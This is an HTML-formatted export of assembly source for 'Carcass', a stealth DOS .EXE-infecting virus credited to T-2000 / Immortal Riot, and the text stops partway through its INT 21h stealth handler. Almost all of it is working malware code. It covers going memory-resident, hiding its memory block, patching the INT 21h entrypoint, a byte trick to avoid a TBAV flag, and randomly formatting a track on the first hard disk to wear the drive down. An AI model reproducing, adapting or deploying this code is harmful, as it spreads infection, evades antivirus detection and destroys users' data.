<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      NAME: Carcass v1.01</span><span class="sc0">
</span><span class="sc1">;      TYPE: Full-stealth .EXE-infector.</span><span class="sc0">
</span><span class="sc1">;       CPU: 286+</span><span class="sc0">
</span><span class="sc1">;      SIZE: Around 1800 bytes.</span><span class="sc0">
</span><span class="sc1">;      DATE: September 1999 - December 1999.</span><span class="sc0">
</span><span class="sc1">;    AUTHOR: T-2000 / Immortal Riot.</span><span class="sc0">
</span><span class="sc1">;    E-MAIL: T2000_@hotmail.com</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  FEATURES:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       - Full-stealth (network-compatible).</span><span class="sc0">
</span><span class="sc1">;       - Splices INT 21h.</span><span class="sc0">
</span><span class="sc1">;       - Tunnels INT 13h with signatures.</span><span class="sc0">
</span><span class="sc1">;       - Random track-mutilation.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This was written for demonstration-purposes only, hence the lack of</span><span class="sc0">
</span><span class="sc1">; many things standard in the average virus. The virus goes resident by</span><span class="sc0">
</span><span class="sc1">; overwriting the INT 21h entrypoint with a JMP FAR to the actual virus-ISR.</span><span class="sc0">
</span><span class="sc1">; This works both in plain DOS and in Win9x DOS-boxes, as the virus will</span><span class="sc0">
</span><span class="sc1">; store it's TSR-code in an reserved section of the BIOS. I've seen very</span><span class="sc0">
</span><span class="sc1">; few virii that incorporate full-stealth *correctly*, so you may want to</span><span class="sc0">
</span><span class="sc1">; take a look at these routines. Furthermore this virus has size-stealth</span><span class="sc0">
</span><span class="sc1">; in Win9x DOS-boxes.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Win9x-systems may become rather unstable, this is because we're messing</span><span class="sc0">
</span><span class="sc1">; with a shared kernel, and DOS doesn't provide us any multitasking functions</span><span class="sc0">
</span><span class="sc1">; (ie. semaphores, mutexes, etc), so be it..</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">


                </span><span class="sc2">.286</span><span class="sc0">
                </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">TINY</span><span class="sc0">
                </span><span class="sc9">.STACK</span><span class="sc0">  </span><span class="sc2">1024</span><span class="sc0">
                </span><span class="sc9">.CODE</span><span class="sc0">


</span><span class="sc5">Virus_Size</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Virus_End</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Virus_Size_Mem</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc5">Virus_End_Mem</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+</span><span class="sc2">15</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">Century</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc2">100</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_IP</span><span class="sc0">

</span><span class="sc5">Copyright</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'[Carcass] by T-2000 / Immortal Riot'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Get_IP</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Copyright</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EF00h</span><span class="sc0">              </span><span class="sc1">; Residency-check.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">Do_Int21h</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">                    </span><span class="sc1">; To avoid a TBAV-flag.</span><span class="sc0">

</span><span class="sc5">Do_Int21h</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Already resident?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Check_BIOS</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Jump_To_Host</span><span class="sc0">

</span><span class="sc5">Check_BIOS</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Attempt to change a byte.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">             </span><span class="sc1">; If it changed, it's no ROM.</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Copy_Virus_TSR</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

</span><span class="sc5">Attempt_Alloc</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">                 </span><span class="sc1">; Attempt to allocate memory</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size_Mem</span><span class="sc0">      </span><span class="sc1">; the DOS way.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">Hide_Virus_MCB</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; We're in a infinite loop?</span><span class="sc0">
                </span><span class="sc6">JNP</span><span class="sc0">     </span><span class="sc5">Jump_To_Host</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">                 </span><span class="sc1">; Get amount of DOS-memory</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                  </span><span class="sc1">; in current block (ES).</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">                 </span><span class="sc1">; Resize it so there's space</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size_Mem</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; for the virus.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Jump_To_Host</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Attempt_Alloc</span><span class="sc0">

</span><span class="sc5">Hide_Virus_MCB</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Get MCB of allocated block.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">DI.MCB_PSP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0008h</span><span class="sc0">  </span><span class="sc1">; Mark it as a system-block.</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

</span><span class="sc5">Copy_Virus_TSR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">          </span><span class="sc1">; Copy the virus up to the</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; allocated memory.</span><span class="sc0">
                </span><span class="sc5">SEGCS</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; Hop to our allocated code.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">Relocated</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">RETF</span><span class="sc0">

</span><span class="sc5">Relocated</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">INT_Entry_Bytes</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3521h</span><span class="sc0">               </span><span class="sc1">; Grab INT 21h's address.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Orig_Int21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">         </span><span class="sc1">; Save it.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Orig_Int21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Swap_JMP</span><span class="sc0">                </span><span class="sc1">; Patch INT 21h's entrypoint.</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Get a random value.</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Get another random value.</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Randomize.</span><span class="sc0">
                </span><span class="sc6">JNS</span><span class="sc0">     </span><span class="sc5">Zero_Delta</span><span class="sc0">              </span><span class="sc1">; Should we mutilate a</span><span class="sc0">
                </span><span class="sc6">JNP</span><span class="sc0">     </span><span class="sc5">Zero_Delta</span><span class="sc0">              </span><span class="sc1">; random track on C: ?</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0F000h</span><span class="sc0">                  </span><span class="sc1">; Standard INT 13h segment.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">

</span><span class="sc5">Find_Int13h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFF0h</span><span class="sc0">              </span><span class="sc1">; Didn't find it?</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Zero_Delta</span><span class="sc0">              </span><span class="sc1">; Then abort the loop.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Real_Int13h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">      </span><span class="sc1">; Store possible INT 13h.</span><span class="sc0">

                </span><span class="sc6">LODSB</span><span class="sc0">                           </span><span class="sc1">; Fetch next instruction.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FBh</span><span class="sc0">                </span><span class="sc1">; STI ?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Find_Int13h</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FA80h</span><span class="sc0">         </span><span class="sc1">; CMP DL, 80h ?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Find_Int13h</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Randomize some more.</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Set random track &amp; head.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">                 </span><span class="sc1">; Reset first harddisk.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Real_Int13h</span><span class="sc0">

</span><span class="sc1">; Random track-formatting is a very effective way of getting a harddisk to</span><span class="sc0">
</span><span class="sc1">; detoriate at high speed. Instead of destroying actual sector-data, it</span><span class="sc0">
</span><span class="sc1">; mutilates track-data. Afterwards, the mutilated track may or may not be</span><span class="sc0">
</span><span class="sc1">; correctly interpreted by the HDD-controller.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">                 </span><span class="sc1">; Format random track on it.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Real_Int13h</span><span class="sc0">

</span><span class="sc5">Zero_Delta</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">

</span><span class="sc5">Jump_To_Host</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">256</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">LES</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+(</span><span class="sc5">File_Header.Program_IP</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+(</span><span class="sc5">Host_CS</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+(</span><span class="sc5">Host_IP</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">LES</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+(</span><span class="sc5">File_Header.Program_SS</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+(</span><span class="sc5">Host_SS</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+(</span><span class="sc5">Host_SP</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; Restore all registers.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">                     </span><span class="sc1">; Flush prefetcher.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0DEADh</span><span class="sc0">                  </span><span class="sc1">; Restore host's original</span><span class="sc0">
</span><span class="sc5">Host_SS</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; stack.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DEADh</span><span class="sc0">
</span><span class="sc5">Host_SP</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">                    </span><span class="sc1">; Jump to the host.</span><span class="sc0">
</span><span class="sc5">Host_IP</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Host_CS</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">File_Header</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Carrier</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc1">; One could optimize the ISR even more by using CALL_Reg16's</span><span class="sc0">
        </span><span class="sc1">; (2 bytes), instead of CALL_Imm16's (3 bytes) when issueing</span><span class="sc0">
        </span><span class="sc1">; a Do_Old_Int21h.</span><span class="sc0">

</span><span class="sc5">Virus_Int21h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EF00h</span><span class="sc0">              </span><span class="sc1">; It's our residency-check?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Check_If_Hook</span><span class="sc0">

                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; If so, return our marker.</span><span class="sc0">

                </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">Check_If_Hook</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Swap_JMP</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4B01h</span><span class="sc0">               </span><span class="sc1">; Load but not execute image?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Test_For_5700h</span><span class="sc0">

</span><span class="sc5">Stealth_Load</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Saved_BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">         </span><span class="sc1">; Save BX but keep the stack.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">           </span><span class="sc1">; Call the function.</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">                           </span><span class="sc1">; Save all registers.</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_St_Load</span><span class="sc0">            </span><span class="sc1">; Bail on error.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc0">                 </span><span class="sc1">; Get it's PSP.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+(</span><span class="sc2">256</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc4">)]</span><span class="sc0">       </span><span class="sc1">; AX = effective segment.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DEADh</span><span class="sc0">              </span><span class="sc1">; Get the old BX.</span><span class="sc0">
